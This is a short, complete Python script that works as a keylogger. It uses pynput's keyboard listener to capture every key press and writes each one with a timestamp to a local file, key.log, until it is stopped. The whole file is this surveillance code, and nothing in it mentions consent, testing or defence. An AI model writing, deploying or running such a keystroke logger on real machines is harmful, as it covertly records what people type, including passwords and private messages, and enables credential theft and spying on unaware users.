#!/usr/bin/env python3

import logging
from pynput.keyboard import Key, Listener

# Log file
logfile_dir = ""

# Log format
logging.basicConfig(
        filename=(logfile_dir + "key.log"),
        level=logging.DEBUG,
        format='%(asctime)s - %(message)s'
        )

def keypress(key):
    logging.info(str(key))

with Listener(on_press=keypress) as listener:
    listener.join()

